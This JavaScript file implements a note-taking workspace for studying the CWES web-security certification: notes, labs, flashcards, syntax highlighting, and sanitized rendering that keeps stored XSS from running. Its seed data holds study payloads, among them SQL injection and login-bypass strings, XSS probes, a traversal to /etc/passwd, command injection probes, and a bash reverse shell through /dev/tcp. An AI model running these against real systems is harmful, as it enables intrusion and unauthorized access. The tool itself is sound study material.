// vault.js: the CWES workspace page type ("vault").
//
// index.html owns storage, sync, undo and the page shell; this file only knows
// a page's `vault` object:
//   Vault.normalize(v)  validate saved data (loading, importing, sync), v1 -> v2
//   Vault.fresh()       a new workspace: CWES modules, methodologies, payloads, examples
//   Vault.hasData(v)    anything worth backing up (the sidebar's reminder)
//   Vault.mount(ctx)    draw the page into ctx.root; ctx = { root, page, save }
//   Vault.attach(api)   site-wide quick capture (Alt+C); api = { page(), save(), go(id) }
//
// Everything is an *entry* in `notes` with a type: note, lab, payload, http,
// method or capture. They share title, markdown body, tags, module, typed
// relations and a revision schedule, so links, backlinks, search, the graph
// and flashcards work across all of them. What can be read from the text
// ([[links]], #tags, code blocks, flashcards) is never stored, only derived.
// Screenshots live in `imgs` as standalone data URLs (so sync uploads each
// once) and notes point at them with ![alt](img:<id>).
// Rendering escapes every character first: these notes are full of XSS
// payloads and captured traffic, which must show as text and never run.
(function(){
"use strict";

// ---------- constants ----------
var MODULES = [
  "Web Requests", "Introduction to Web Applications", "Using Web Proxies",
  "Information Gathering - Web Edition", "Attacking Web Applications with Ffuf",
  "JavaScript Deobfuscation", "Cross-Site Scripting (XSS)", "SQL Injection Fundamentals",
  "SQLMap Essentials", "Command Injections", "File Upload Attacks", "Server-side Attacks",
  "Login Brute Forcing", "Broken Authentication", "Web Attacks", "File Inclusion",
  "Session Security", "Web Service & API Attacks", "Hacking WordPress", "Bug Bounty Hunting Process"
];
var STATUS = ["todo", "learning", "done", "reviewed"];
var TYPES = ["note", "lab", "payload", "http", "method", "capture"];
// typed relations, read from the entry that stores them: f forward, b backward
var REL = {
  leads:{ f:"leads to", b:"reached from" },
  cause:{ f:"root cause", b:"root cause of" },
  tech:{ f:"exploited with", b:"technique for" },
  fix:{ f:"mitigated by", b:"mitigates" },
  practises:{ f:"practises", b:"practised in" },
  payload:{ f:"payload for", b:"payloads" },
  method:{ f:"methodology for", b:"tested with" },
  see:{ f:"related", b:"related" }
};
var REL_KEYS = Object.keys(REL);
var PLATFORMS = ["PortSwigger", "Hack The Box", "HTB Academy", "TryHackMe", "PentesterLab", "VulnHub", "bug bounty", "own lab"];
var DIFFS = ["apprentice", "practitioner", "expert", "easy", "medium", "hard", "insane"];
var LAB_STATUS = ["todo", "in progress", "solved", "stuck"];
var PAY_CATS = ["payload", "linux", "windows", "burp", "http", "sql", "script", "regex", "wordlist", "reference"];
var VAR_KEYS = ["IP", "PORT", "URL", "DOMAIN", "LHOST", "LPORT"];
var VAR_HINT = { IP:"10.129.x.x", PORT:"80", URL:"http://target.htb", DOMAIN:"target.htb", LHOST:"10.10.14.x", LPORT:"9001" };
var BOX = [0, 1, 3, 7, 14, 30, 60, 120];   // days until the next review, per box
var MATURE = 4;                            // box 4+ (two weeks or more) counts as known
var NEW_PER_DAY = 20;
var VAR_RE = /\{\{([A-Za-z_]\w{0,30})\}\}/g;
var IMG_OK = /^data:image\/(?:png|jpeg|webp|gif);base64,[A-Za-z0-9+\/=]+$/;
var IMG_REF = /\]\(img:(i[a-z0-9]{4,20})\)/g;
var CALLOUT = { note:"note", info:"note", abstract:"note", summary:"note", example:"note", question:"note", quote:"note", todo:"note",
  tip:"tip", hint:"tip", important:"tip", success:"tip", check:"tip",
  warning:"warn", caution:"warn", danger:"warn", bug:"warn", failure:"warn", error:"warn" };
var FENCE = /^\s*(`{3,}|~{3,})\s*([^\s`]*)[ \t]*(.*)$/;
var HEAD = /^(#{1,6})\s+(.*)$/;
var LIST = /^(\s*)([-*+]|\d{1,3}[.)])\s+(?:\[([ xX])\]\s+)?(.*)$/;
var TSEP = /^\s*\|?\s*:?-{2,}:?\s*(?:\|\s*:?-{2,}:?\s*)*\|?\s*$/;
var WL_RE = /\[\[([^\[\]|\n]+)(?:\|([^\[\]\n]+))?\]\]/g;
var TAG_RE = /(^|\s)#([A-Za-z][\w\-\/]*)/g;
var TAG_OK = /^[a-z][\w\-\/]{0,40}$/;

// ---------- small helpers ----------
function rid(p){ return (p || "v") + Date.now().toString(36) + Math.random().toString(36).slice(2, 7); }
function str(v, max){ v = String(v == null ? "" : v); return max ? v.slice(0, max) : v; }
function int(v, lo, hi){ v = Math.round(+v); return isFinite(v) ? Math.min(Math.max(v, lo), hi) : lo; }
function pad(n){ return (n < 10 ? "0" : "") + n; }
function isoOf(d){ return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()); }
function today(){ return isoOf(new Date()); }
function parseIso(s){ var m = /^(\d{4})-(\d{2})-(\d{2})$/.exec(s || ""); return m ? new Date(+m[1], +m[2] - 1, +m[3]) : null; }
function isIso(s){ var d = parseIso(s); return !!d && isoOf(d) === s; }
function addDays(s, k){ var d = parseIso(s) || new Date(); return isoOf(new Date(d.getFullYear(), d.getMonth(), d.getDate() + k)); }
function dayDiff(a, b){ return Math.round((parseIso(b) - parseIso(a)) / 86400000); }
var ESC = { "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#39;" };
function esc(s){ return String(s).replace(/[&<>"']/g, function(c){ return ESC[c]; }); }
function reEsc(s){ return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }
function hash(s){ var x = 0x811c9dc5; for(var i = 0; i < s.length; i++){ x ^= s.charCodeAt(i); x = Math.imul(x, 0x01000193); } return (x >>> 0).toString(36); }
function lower(s){ return String(s || "").trim().toLowerCase(); }
function uniq(a){ var s = {}; return a.filter(function(x){ var k = String(x).toLowerCase(); if(s[k]) return false; s[k] = 1; return true; }); }
function plural(n, w){ return n + " " + (n === 1 ? w : /[^aeiou]y$/.test(w) ? w.slice(0, -1) + "ies" : w + "s"); }
function obj(v){ return v && typeof v === "object" && !Array.isArray(v) ? v : {}; }
function arr(v){ return Array.isArray(v) ? v : []; }
function safeUrl(u){ u = str(u, 1000).trim(); return /^https?:\/\//i.test(u) ? u : ""; }
function ago(ts){
  var s = Math.max(0, (Date.now() - ts) / 1000);
  if(s < 60) return "just now";
  if(s < 3600) return Math.floor(s / 60) + "m ago";
  if(s < 86400) return Math.floor(s / 3600) + "h ago";
  if(s < 86400 * 30) return Math.floor(s / 86400) + "d ago";
  return isoOf(new Date(ts));
}
function days(n){ return n <= 0 ? "now" : n < 30 ? n + "d" : Math.round(n / 30) + "mo"; }
function hm(min){ min = Math.round(min); return min < 60 ? min + "m" : Math.floor(min / 60) + "h" + (min % 60 ? " " + (min % 60) + "m" : ""); }

// ---------- data ----------
function L(){ return Array.prototype.slice.call(arguments).join("\n"); }
var F = "```";
function defaultModules(){ return MODULES.map(function(n){ return { id:rid("m"), name:n, status:"todo", conf:0, topics:[] }; }); }
function tplBody(type, id){
  if(type === "lab") return L("## objectives", "- ", "", "## initial observations", "", "", "## recon", F + "bash", "", F, "",
    "## methodology", "", "", "## exploitation steps", "1. ", "", "## evidence", "", "", "## requests and responses", F + "http", "", F, "",
    "## payloads and commands", F + "text", "", F, "", "## what worked", "", "", "## what didn't work", "- ", "",
    "## root cause", "", "", "## lessons learned", "- ", "", "## references", "- ");
  if(type === "method") return L("## steps", "- [ ] ", "", "## commands", F + "bash", "", F);
  if(type === "http") return L("## analysis", "");
  if(type !== "note") return "";
  if(id === "vuln") return L("#vuln", "", "## what it is", "", "", "## root cause", "", "", "## where to look", "- ", "",
    "## how to detect", "- ", "", "## exploitation", F + "http", "", F, "", "## impact", "", "", "## mitigation", "- ", "", "## cards", "");
  if(id === "technique") return L("#technique", "", "## when to use it", "", "", "## steps", "1. ", "", "## commands", F + "bash", "", F, "",
    "## pitfalls", "- ", "", "## cards", "");
  if(id === "module") return L("#module", "", "## key ideas", "- ", "", "## commands", F + "bash", "", F, "", "## gotchas", "- ", "", "## cards", "");
  if(id === "finding") return L("#finding", "", "- **severity:** high", "- **cvss 3.1:** ", "- **affected:** {{URL}}", "",
    "## summary", "", "", "## steps to reproduce", "1. ", "", "## evidence", F + "http", "", F, "",
    "## impact", "", "", "## remediation", "", "", "## references", "- ");
  if(id === "cheat") return L("#cheatsheet", "", "## quick reference", F + "bash", "", F, "", "## payloads", F + "text", "", F, "", "## notes", "- ");
  return "";
}
var NOTE_TPL = [
  { id:"blank",     name:"blank note",    hint:"an empty page" },
  { id:"vuln",      name:"vulnerability", hint:"what it is, root cause, detection, exploitation, fixes" },
  { id:"technique", name:"technique",     hint:"one exploitation technique, step by step" },
  { id:"module",    name:"module notes",  hint:"key ideas, commands, gotchas, cards" },
  { id:"finding",   name:"finding",       hint:"one vulnerability, written like the exam report" },
  { id:"cheat",     name:"cheat sheet",   hint:"commands and payloads for one topic" }
];
function entry(type, title, body, extra){
  var now = Date.now(), e = { id:rid(type.charAt(0)), type:type, title:title, body:body, mod:"", tags:[], rels:[], pinned:false, createdAt:now, updatedAt:now };
  if(type === "lab") e.lab = { platform:"", diff:"", date:"", status:"todo", mins:0, url:"" };
  if(type === "payload") e.pay = { cat:"payload", lang:"text", code:"" };
  if(type === "http") e.http = { req:"", res:"", ann:{} };
  if(type === "method") e.runs = [];
  Object.keys(extra || {}).forEach(function(k){ e[k] = extra[k]; });
  return e;
}
// the starter set: a guide, an exploit chain, a lab to do, captured traffic,
// five methodologies and a payload shelf. All marked seed until edited.
function seed(mods){
  function mod(name){ var m = mods.filter(function(x){ return x.name === name; })[0]; return m ? m.id : ""; }
  var t = Date.now(), k = 0, all = [];
  function S(e){ e.seed = true; e.updatedAt = e.createdAt = t - (k++) * 1000; all.push(e); return e; }
  S(entry("note", "start here", L(
    "This workspace keeps everything you learn for CWES in one connected place. Every tab holds entries of one kind; all of them link, tag, search and graph together. #meta",
    "",
    "## the tabs",
    "- **inbox**: quick captures. Press Alt+C on any page of the site, type or paste (even a screenshot), sort it later.",
    "- **notes**: concepts and techniques. Templates for vulnerabilities, techniques, findings and cheat sheets.",
    "- **labs**: your lab journal. Turn a solved lab into a technique note, or send its payloads to the library.",
    "- **http**: paste a raw request and response from Burp. It lists parameters, headers and cookies and points out leads like reflected parameters.",
    "- **payloads**: payloads and commands, copied with your target filled in.",
    "- **methods**: testing checklists you can run against a target.",
    "- **review**: flashcards and notes marked for revision, on a spaced schedule.",
    "- **roadmap** and **graph**: what you know, and how it connects.",
    "",
    "## writing",
    "Type `[[` to link an entry, like [[sql injection]]. `#tags` tag it. Paste or drop a screenshot straight into the editor. To connect two entries, press **+ connect** under the title and pick one; click the little red label later if you want to say how they connect (leads to, root cause...).",
    "",
    "Write {{IP}}, {{PORT}}, {{LHOST}} in commands, set the target once in the bar, and every command copies with the real values:",
    "",
    F + "bash full port scan",
    "nmap -sC -sV -p- -oA scans/full {{IP}}",
    F,
    "",
    "## flashcards",
    "Write `question :: answer` on a line, or a Q: line followed by an A: line.",
    "",
    "what does the -sV flag in nmap do :: probes open ports to find out which service and version runs there",
    "",
    "> [!tip] keys",
    "> Ctrl+K searches everything. Alt+C captures. Alt+N makes a new entry in the tab you're on. Alt+1 to Alt+0 switch tabs. ? lists the rest.",
    "",
    "> [!warning] stay legal",
    "> Only attack what you're allowed to: HTB, your own labs, or programs that authorise you."
  ), { pinned:true }));
  var sqli = S(entry("note", "sql injection", L(
    "#sqli #web",
    "",
    "## what it is",
    "User input ends up inside an SQL query as code instead of data, so the attacker can change what the query does.",
    "",
    "## spot it",
    "- a single quote `'` breaks the page or shows a database error",
    "- the page changes between `' AND 1=1-- -` and `' AND 1=2-- -`",
    "",
    "## union based",
    "Find the column count first, then which columns are printed:",
    F + "sql",
    "' ORDER BY 1-- -",
    "' UNION SELECT 1,2,3,4-- -",
    "' UNION SELECT 1,@@version,user(),database()-- -",
    F,
    "",
    "## sqlmap",
    F + "bash list databases",
    "sqlmap -u \"http://{{IP}}:{{PORT}}/index.php?id=1\" --batch --dbs",
    F,
    "",
    "## cards",
    "why add `-- -` to the end of a payload :: it comments out the rest of the query; MySQL needs a space after --, and the last - stops that space being trimmed",
    "why find the column count before a UNION :: both SELECTs must return the same number of columns"
  ), { mod:mod("SQL Injection Fundamentals") }));
  var cause = S(entry("note", "unparameterised queries", L(
    "#rootcause",
    "",
    "Building SQL by concatenating user input into the query string. The fix is prepared statements (parameterised queries), where the query and the data travel separately."
  )));
  var bypass = S(entry("note", "authentication bypass", L(
    "#auth",
    "",
    "Getting past a login without valid credentials. With SQL injection the classic form makes the WHERE clause always true:",
    "",
    F + "sql",
    "admin' OR '1'='1'-- -",
    F
  ), { mod:mod("Broken Authentication") }));
  var dbenum = S(entry("note", "database enumeration", L(
    "#sqli",
    "",
    "Mapping what the database holds through an injection: databases, tables, then columns, using information_schema on MySQL.",
    "",
    F + "sql",
    "' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -",
    "' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='dev'-- -",
    F
  ), { mod:mod("SQL Injection Fundamentals") }));
  var exfil = S(entry("note", "data exfiltration", L(
    "#impact",
    "",
    "Pulling the data out once you know where it is: credentials, sessions, personal data. In a report this is the impact that makes the finding critical."
  )));
  sqli.rels = [{ t:"cause", id:cause.id }, { t:"leads", id:bypass.id }, { t:"leads", id:dbenum.id }];
  dbenum.rels = [{ t:"leads", id:exfil.id }];
  S(entry("lab", "SQL injection vulnerability allowing login bypass", tplBody("lab"),
    { lab:{ platform:"PortSwigger", diff:"apprentice", date:"", status:"todo", mins:0, url:"https://portswigger.net/web-security/sql-injection/lab-login-bypass" },
      rels:[{ t:"practises", id:bypass.id }, { t:"practises", id:sqli.id }], mod:mod("SQL Injection Fundamentals") }));
  S(entry("http", "search page reflects q", L("## analysis", "The search term comes back in the page unencoded. Next: check which characters survive, see [[sql injection]] for the quote test too."),
    { http:{ ann:{ "q:q":"my marker, comes back in the h1" },
      req:L("GET /search?q=hello123 HTTP/1.1", "Host: target.htb", "User-Agent: Mozilla/5.0", "Cookie: session=6f1e0c2a; theme=dark", ""),
      res:L("HTTP/1.1 200 OK", "Server: Apache/2.4.41 (Ubuntu)", "Set-Cookie: session=6f1e0c2a; Path=/", "Content-Type: text/html; charset=UTF-8", "", "<h1>Results for hello123</h1>") } }));
  function M(title, body){ return S(entry("method", title, body)); }
  M("web recon", L("#recon", "", "## map it",
    "- [ ] browse every page through Burp with the proxy history on",
    "- [ ] list every form, parameter and API call that reaches the server",
    "- [ ] note the stack: headers, cookies, extensions, error pages",
    "- [ ] read robots.txt, sitemap.xml and HTML comments",
    "- [ ] read the JavaScript for endpoints, routes and keys",
    "", "## fuzz",
    "- [ ] directories and files, with the extensions the stack uses",
    "- [ ] virtual hosts and subdomains",
    "- [ ] hidden parameters on interesting pages",
    "", "## commands",
    F + "bash",
    "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://{{IP}}:{{PORT}}/FUZZ -e .php,.txt,.bak",
    "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{{IP}}:{{PORT}}/ -H \"Host: FUZZ.{{DOMAIN}}\" -fs 0",
    F));
  var sqlm = M("sql injection testing", L("#sqli", "",
    "- [ ] send ' and \" to every parameter; watch errors, status and length",
    "- [ ] compare a true and a false condition (AND 1=1 vs AND 1=2)",
    "- [ ] try a time delay for blind injection (SLEEP(5))",
    "- [ ] find the comment style and the column count (ORDER BY)",
    "- [ ] UNION SELECT to find which columns are printed",
    "- [ ] fingerprint the database and its version",
    "- [ ] enumerate databases, tables and columns",
    "- [ ] check file read and write (LOAD_FILE, INTO OUTFILE)",
    "- [ ] confirm with sqlmap once you understand it by hand"));
  M("xss testing", L("#xss", "",
    "- [ ] put a unique marker in every input and find where it comes back",
    "- [ ] work out the context: HTML body, attribute, JavaScript, URL",
    "- [ ] check which characters survive: < > \" ' / and backticks",
    "- [ ] try a payload that fits the context",
    "- [ ] check whether stored input shows to other users or an admin",
    "- [ ] look for DOM sinks in the JavaScript (innerHTML, document.write, location)",
    "- [ ] turn the alert into impact: read a cookie or act as the victim"));
  M("file upload testing", L("#upload", "",
    "- [ ] upload an allowed file and find where it is stored and served",
    "- [ ] bypass client-side checks by editing the request in Burp",
    "- [ ] try other extensions (.phtml, .php5, .phar), mixed case and double extensions",
    "- [ ] change the Content-Type and add magic bytes",
    "- [ ] try SVG or HTML for stored XSS, and XML-based files for XXE",
    "- [ ] check whether the upload folder runs code"));
  M("authentication testing", L("#auth", "",
    "- [ ] enumerate usernames through messages, timing or response length",
    "- [ ] check lockout and rate limiting before brute forcing",
    "- [ ] try default credentials",
    "- [ ] test password reset: token guessing, reuse, Host header",
    "- [ ] check the session cookie's flags and that it changes at login",
    "- [ ] try skipping or replaying the 2FA step",
    "- [ ] call every endpoint logged out and as a low-privilege user"));
  sqlm.rels = [{ t:"method", id:sqli.id }];
  function P(title, cat, lang, code, desc, rels){ return S(entry("payload", title, desc || "", { pay:{ cat:cat, lang:lang, code:code }, rels:rels || [] })); }
  P("XSS probe", "payload", "html", "<script>alert(document.domain)</script>", "Shows the origin the script runs in, which proves impact better than alert(1). #xss");
  P("XSS without script tags", "payload", "html", "<img src=x onerror=alert(document.domain)>", "For filters that strip <script>. #xss");
  P("login bypass", "payload", "sql", "admin' OR '1'='1'-- -", "", [{ t:"payload", id:bypass.id }]);
  P("path traversal", "payload", "text", "../../../../etc/passwd", "Add more ../ than you need; extra ones are ignored at /. #lfi");
  P("command injection probes", "payload", "text", L("; id", "| id", "$(id)", "`id`", "%0a id"), "Different separators for different filters. #cmdi");
  P("reverse shell (bash)", "linux", "bash", "bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'", "Start a listener first: nc -lvnp {{LPORT}} #shell");
  P("directory fuzz", "linux", "bash", "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://{{IP}}:{{PORT}}/FUZZ -ic", "#recon");
  P("POST with curl", "http", "bash", "curl -s -i -X POST http://{{IP}}:{{PORT}}/login -d 'username=admin&password=admin' -c cookies.txt", "-c saves the cookies for the next request (-b cookies.txt). #http");
  return all;
}
function fresh(){
  var mods = defaultModules();
  return { v:2, modules:mods, notes:seed(mods), vars:{}, cards:{}, act:{}, imgs:{} };
}

function normTags(a){ return uniq(arr(a).map(function(t){ return lower(t).replace(/^#/, ""); }).filter(function(t){ return TAG_OK.test(t); })).slice(0, 30); }
function normEntry(n, mids){
  var now = Date.now(), type = TYPES.indexOf(n.type) >= 0 ? n.type : "note";
  var o = { id:str(n.id || rid("n"), 40), type:type, title:str(n.title, 200), body:str(n.body),
            mod:mids[n.mod] ? String(n.mod) : "", tags:normTags(n.tags), rels:[], pinned:!!n.pinned,
            createdAt:isFinite(n.createdAt) && +n.createdAt > 0 ? +n.createdAt : now,
            updatedAt:isFinite(n.updatedAt) && +n.updatedAt > 0 ? +n.updatedAt : now };
  var rs = {};
  arr(n.rels).forEach(function(r){
    if(!r || !REL[r.t] || typeof r.id !== "string" || r.id === o.id) return;
    var k = r.t + ":" + r.id; if(rs[k]) return; rs[k] = 1;
    o.rels.push({ t:r.t, id:r.id.slice(0, 40) });
  });
  if(n.seed) o.seed = true;
  if(n.rev && isIso(n.rev.due)) o.rev = { b:int(n.rev.b, 0, BOX.length - 1), due:n.rev.due, n:int(n.rev.n, 0, 1e6), l:int(n.rev.l, 0, 1e6) };
  if(type === "lab"){
    var lb = obj(n.lab);
    o.lab = { platform:str(lb.platform, 40), diff:DIFFS.indexOf(lb.diff) >= 0 ? lb.diff : "", date:isIso(lb.date) ? lb.date : "",
              status:LAB_STATUS.indexOf(lb.status) >= 0 ? lb.status : "todo", mins:int(lb.mins, 0, 100000), url:safeUrl(lb.url) };
  }
  if(type === "payload"){
    var pl = obj(n.pay);
    o.pay = { cat:PAY_CATS.indexOf(pl.cat) >= 0 ? pl.cat : "payload", lang:str(pl.lang, 30).replace(/[^\w+#.-]/g, "") || "text", code:str(pl.code) };
  }
  if(type === "http"){
    var ht = obj(n.http), ann = {};
    Object.keys(obj(ht.ann)).slice(0, 400).forEach(function(k){ if(typeof ht.ann[k] === "string" && ht.ann[k].trim()) ann[k.slice(0, 200)] = ht.ann[k].slice(0, 1000); });
    o.http = { req:str(ht.req), res:str(ht.res), ann:ann };
  }
  if(type === "method"){
    o.runs = arr(n.runs).filter(function(r){ return r && typeof r === "object"; }).slice(0, 60).map(function(r){
      return { id:str(r.id || rid("r"), 40), target:str(r.target, 120), date:isIso(r.date) ? r.date : today(),
               ticks:uniq(arr(r.ticks).filter(function(x){ return typeof x === "string" && /^[a-z0-9]{1,12}$/.test(x); })).slice(0, 2000) };
    });
  }
  return o;
}
function normalize(v){
  v = obj(v);
  var out = { v:2 }, mids = {}, nids = {};
  out.modules = !Array.isArray(v.modules) ? defaultModules() : v.modules.filter(function(m){
    return m && typeof m.name === "string" && m.name.trim();
  }).map(function(m){
    var o = { id:str(m.id || rid("m"), 40), name:str(m.name.trim(), 100),
              status:STATUS.indexOf(m.status) >= 0 ? m.status : "todo", conf:int(m.conf, 0, 5),
              topics:arr(m.topics).filter(function(t){ return t && typeof t.name === "string" && t.name.trim(); }).slice(0, 100)
                .map(function(t){ return { id:str(t.id || rid("t"), 40), name:str(t.name.trim(), 120), done:!!t.done }; }) };
    if(mids[o.id]) o.id = rid("m");
    mids[o.id] = 1;
    return o;
  });
  out.notes = arr(v.notes).filter(function(n){ return n && typeof n === "object"; }).map(function(n){ return normEntry(n, mids); })
    .filter(function(n){ if(nids[n.id]) return false; nids[n.id] = 1; return true; });
  // a relation to an entry that no longer exists goes too
  out.notes.forEach(function(n){ n.rels = n.rels.filter(function(r){ return nids[r.id]; }); });
  out.vars = {};
  Object.keys(obj(v.vars)).forEach(function(k){
    if(/^[A-Za-z_]\w{0,30}$/.test(k) && typeof v.vars[k] === "string" && v.vars[k]) out.vars[k] = v.vars[k].slice(0, 500);
  });
  out.cards = {};
  Object.keys(obj(v.cards)).forEach(function(k){
    var c = v.cards[k];
    if(!/^c[a-z0-9]{1,12}$/.test(k) || !c || !isIso(c.due)) return;
    var o = { b:int(c.b, 0, BOX.length - 1), due:c.due, n:int(c.n, 0, 1e6), l:int(c.l, 0, 1e6) };
    if(isIso(c.f)) o.f = c.f;
    out.cards[k] = o;
  });
  out.act = {};
  Object.keys(obj(v.act)).forEach(function(k){
    var a = v.act[k];
    if(!isIso(k) || !a) return;
    var o = { e:a.e ? 1 : 0, r:int(a.r, 0, 1e5), ok:int(a.ok, 0, 1e5) };
    if(o.ok > o.r) o.ok = o.r;
    if(o.e || o.r) out.act[k] = o;
  });
  // screenshots: only real image data, and only the ones some entry still shows
  var used = {};
  out.notes.forEach(function(n){ var m; IMG_REF.lastIndex = 0; while((m = IMG_REF.exec(n.body))) used[m[1]] = 1; });
  out.imgs = {};
  Object.keys(obj(v.imgs)).forEach(function(k){ if(used[k] && /^i[a-z0-9]{4,20}$/.test(k) && typeof v.imgs[k] === "string" && IMG_OK.test(v.imgs[k])) out.imgs[k] = v.imgs[k]; });
  return out;
}
function hasData(v){
  if(!v) return false;
  return v.notes.some(function(n){ return !n.seed && !!(n.body.trim() || n.title.trim()); }) ||
    Object.keys(v.cards).length > 0 ||
    v.modules.some(function(m){ return m.status !== "todo" || m.conf > 0 || m.topics.length; });
}

// ---------- reading an entry ----------
// inline code is masked (same length) so links, tags and " :: " inside it don't count
function maskCode(ln){ return ln.replace(/`[^`\n]*`/g, function(m){ return new Array(m.length + 1).join("\u0001"); }); }
function closes(ln, f){ var t = ln.trim(); return t.length >= f.length && t.charAt(0) === f.charAt(0) && /^(`+|~+)$/.test(t); }
// the same front whether the card sits in a list, a task or a quote/callout,
// so review and preview agree on its id
function cardFront(f){ return f.replace(/^\s*(?:>\s*)*(?:(?:[-*+]|\d{1,3}[.)])\s+)?(?:\[[ xX]\]\s+)?/, "").trim(); }
function cardSplit(ln){
  var k = maskCode(ln).indexOf(" :: ");
  if(k <= 0) return null;
  var f = cardFront(ln.slice(0, k)), b = ln.slice(k + 4).trim();
  return f && b ? [f, b] : null;
}
function qaAt(lines, i){
  var q = /^\s*(?:>\s*)*Q:\s*(.+)$/i.exec(lines[i]), a = q && /^\s*(?:>\s*)*A:\s*(.+)$/i.exec(lines[i + 1] || "");
  return q && a ? [q[1].trim(), a[1].trim()] : null;
}
function cardKey(noteId, f){ return "c" + hash(noteId + "\n" + f.replace(/\s+/g, " ").trim().toLowerCase()); }
function itemKey(t){ return hash(t.replace(/\s+/g, " ").trim().toLowerCase()); }
function scanBody(body){
  var lines = body.split("\n"), links = [], tags = [], code = [], cards = [], heads = [], checks = [], words = 0;
  var head = "", fence = null, buf = [], lang = "", title = "", m;
  for(var i = 0; i < lines.length; i++){
    var ln = lines[i];
    if(fence){
      if(closes(ln, fence)){ code.push({ lang:lang, title:title, head:head, code:buf.join("\n") }); fence = null; }
      else buf.push(ln);
      continue;
    }
    if((m = FENCE.exec(ln))){ fence = m[1]; lang = lower(m[2]) || "text"; title = m[3].trim(); buf = []; continue; }
    words += (ln.match(/\S+/g) || []).length;
    if((m = HEAD.exec(ln))){ head = m[2].replace(/[*_`=~\[\]#]/g, "").trim(); heads.push({ level:m[1].length, text:head, line:i }); }
    if((m = LIST.exec(ln)) && m[3] !== undefined && m[4].trim()) checks.push({ text:m[4].trim(), key:itemKey(m[4]), head:head, line:i });
    var mk = maskCode(ln);
    mk.replace(WL_RE, function(_, t){ links.push(t.trim()); return ""; });
    mk.replace(TAG_RE, function(_, p, t){ tags.push(t.toLowerCase()); return ""; });
    // headings and table rows never render as cards, so they don't count as cards
    var cd = HEAD.test(ln) || /^\s*\|/.test(ln) ? null : qaAt(lines, i) || cardSplit(ln);
    if(cd) cards.push({ f:cd[0], b:cd[1] });
  }
  if(fence) code.push({ lang:lang, title:title, head:head, code:buf.join("\n") });
  return { links:uniq(links), tags:uniq(tags), code:code, cards:cards, heads:heads, checks:checks, words:words };
}
var scanCache = {};
function scan(n){
  var c = scanCache[n.id];
  if(c && c.body === n.body) return c.res;
  var res = scanBody(n.body);
  scanCache[n.id] = { body:n.body, res:res };
  return res;
}
function tagsOf(n){ return uniq(n.tags.concat(scan(n).tags)); }
// the body cut at its headings: what a revision session asks about
function sections(body){
  var lines = body.split("\n"), out = [], cur = null, fence = null;
  lines.forEach(function(ln){
    var m;
    if(fence){ if(closes(ln, fence)) fence = null; if(cur) cur.lines.push(ln); return; }
    if((m = FENCE.exec(ln))){ fence = m[1]; if(cur) cur.lines.push(ln); return; }
    if((m = HEAD.exec(ln)) && m[1].length <= 3){ cur = { h:m[2].replace(/[*_`=~\[\]]/g, "").trim(), lines:[] }; out.push(cur); return; }
    if(cur) cur.lines.push(ln);
  });
  return out.map(function(s){ return { h:s.h, text:s.lines.join("\n").trim() }; })
    .filter(function(s){ return s.text && !/^(cards|references|source)$/i.test(s.h); });
}

// ---------- syntax highlighting (no library) ----------
var KW = {
  sh:"if then else elif fi for while until do done case esac in function return export local",
  sql:"select union all from where and or not order group by having limit offset insert into values update set delete drop table database schema like null is as join left right inner on case when then else end sleep benchmark concat group_concat substring substr ascii char load_file outfile dumpfile information_schema tables columns version user",
  js:"var let const function return if else for while do break continue new this typeof instanceof try catch finally throw class extends import export from await async null undefined true false",
  py:"def return if elif else for while in import from as class try except finally raise with lambda None True False and or not is pass yield global",
  php:"echo print function return if else elseif foreach as while for include require include_once require_once new class public private protected static null true false array isset unset die exit"
};
// strings must close on the same line: payloads open with a lone quote (' OR 1=1)
// and must not turn the rest of the line into one string
var R_STR = /"(?:\\.|[^"\\\n])*"|'(?:\\.|[^'\\\n])*'/.source;
// in SQL a quoted string holds no spaces, so ' UNION SELECT ... -- - still shows its keywords
var R_SQLSTR = /"[^"\\\s]*"|'[^'\\\s]*'/.source;
var R_NUM = /\b\d+(?:\.\d+)*\b/.source;
function kw(list){ return "\\b(?:" + list.split(" ").join("|") + ")\\b"; }
function build(parts, flags){
  return { re:new RegExp(parts.map(function(p){ return "(" + p[1] + ")"; }).join("|"), flags),
           cls:parts.map(function(p){ return p[0]; }) };
}
var LANGS = {
  sh:build([["c", /(?<=^|\s)#.*/.source], ["s", R_STR + "|`[^`\\n]*`"], ["v", /\$\{[^}\n]*\}|\$\w+/.source],
            ["k", kw(KW.sh)], ["f", /(?<=^|\s)--?[A-Za-z][\w-]*/.source],
            ["x", /(?<=^[ \t]*|[|;&][ \t]*|\$\(|\bsudo[ \t]+)[A-Za-z_.\/][\w.\/+-]*/.source], ["n", R_NUM]], "gm"),
  sql:build([["c", /--.*|#.*|\/\*[\s\S]*?\*\//.source], ["s", R_SQLSTR + "|`[^`\\s]*`"], ["k", kw(KW.sql)],
             ["v", /@@?\w+/.source], ["n", R_NUM]], "gmi"),
  http:build([["k", /^(?:GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|TRACE|CONNECT)\b/.source], ["n", /\bHTTP\/[\d.]+(?: \d{3})?/.source],
              ["a", /^[A-Za-z][\w-]*(?=:)/.source], ["s", R_STR]], "gm"),
  js:build([["c", /\/\/.*|\/\*[\s\S]*?\*\//.source], ["s", R_STR + "|`(?:\\\\.|[^`\\\\])*`"], ["k", kw(KW.js)], ["n", R_NUM]], "gm"),
  py:build([["c", /#.*/.source], ["s", R_STR], ["k", kw(KW.py)], ["n", R_NUM]], "gm"),
  php:build([["x", /<\?php|<\?=|\?>/.source], ["c", /\/\/.*|#.*|\/\*[\s\S]*?\*\//.source], ["s", R_STR],
             ["v", /\$\w+/.source], ["k", kw(KW.php)], ["n", R_NUM]], "gmi"),
  html:build([["c", /<!--[\s\S]*?-->/.source], ["k", /<\/?[A-Za-z][\w:-]*|\/?>/.source],
              ["a", /\b[A-Za-z_:][\w:.-]*(?==)/.source], ["s", R_STR]], "gm"),
  plain:build([["c", /(?<=^|\s)(?:#|\/\/).*/.source], ["s", R_STR], ["n", R_NUM]], "gm")
};
function langOf(l){
  l = lower(l);
